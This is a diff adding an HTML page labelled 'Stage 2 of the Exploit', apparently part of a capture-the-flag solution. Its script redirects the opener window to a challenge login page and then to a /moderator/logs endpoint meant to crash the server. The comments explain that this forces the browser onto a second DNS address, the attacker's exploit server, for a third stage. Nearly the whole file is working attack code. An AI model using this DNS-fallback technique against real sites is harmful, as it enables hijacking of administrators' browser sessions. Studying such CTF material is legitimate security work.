@@ -1,0 +1,24 @@
+<html>
+    <script>
+        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+        async function exploit(){
+            /* 
+            * This changes the location of the opener (which is stage-1) to the login page.
+            * Actually the URL sends two DNS A-Record, one for the challenge server and the other one for the exploit server.
+            * The admin will land on the challenge page, because Chrome will prefer the local address over the remote one. (?)
+            * Last minute change, the aformentioned statement is not correct. Apparently is random.
+            * Maybe since there are some DNS caching magic happening we can try to saturate the cache with random fetch in order to make the exploit more reliable.
+            * The request to /moderator/logs will make the server crash. The browser will then perform the request to the other address as fallback.
+            * On the other address there will be the third stage.
+            */
+            opener.location = "http://local.escapelnzeros.me:3000/login"
+            for (let i = 0; i < 60; i++) {
+                await sleep(100);
+            }
+            opener.location = "http://local.escapelnzeros.me:3000/moderator/logs"
+        }
+    </script>
+    <head>Stage 2 of the Exploit</head>
+    <body onload="exploit()"></body>
+</html>
